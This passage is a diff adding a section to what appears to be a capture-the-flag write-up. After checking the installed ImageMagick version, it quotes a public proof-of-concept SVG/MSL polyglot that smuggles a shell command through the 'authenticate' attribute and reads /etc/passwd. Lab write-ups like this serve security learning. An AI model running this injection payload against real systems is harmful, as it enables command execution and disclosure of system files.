@@ -530,3 +530,46 @@ lrwxrwxrwx 1 root root 6 Aug 29  2021 /usr/local/bin/mogrify -> magick
 ```
 
 <br />
+
+Throughout its `history`, this `tool` has had several `vulnerabilities`, so let's `check` its `version` to see if it is `vulnerable`:
+
+<br />
+
+```bash
+www-data@meta:/tmp$ magick -version
+Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
+Copyright: © 1999-2020 ImageMagick Studio LLC
+License: https://imagemagick.org/script/license.php
+Features: Cipher DPC HDRI OpenMP(4.5) 
+Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib
+```
+
+<br />
+
+The `version` in use is the `ImageMagick 7.0.10-36` one.
+
+<br />
+
+## Mogrify Command Injection:
+
+<br />
+
+Doing a `great` job of `searching` we found a ![post](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html) that tells us how we can `exploit` this `version` of `ImageMagick`.
+
+The `author` explains how we can `inject` commands into a `SVG MSL Polylot File` like this:
+
+<br />
+
+```SVG
+<image authenticate='ff" `echo $(id)> ./0wned`;"'>
+  <read filename="pdf:/etc/passwd"/>
+  <get width="base-width" height="base-height" />
+  <resize geometry="400x400" />
+  <write filename="test.png" />
+  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
+  <image xlink:href="msl:poc.svg" height="100" width="100"/>
+  </svg>
+</image>
+```
+
+<br />
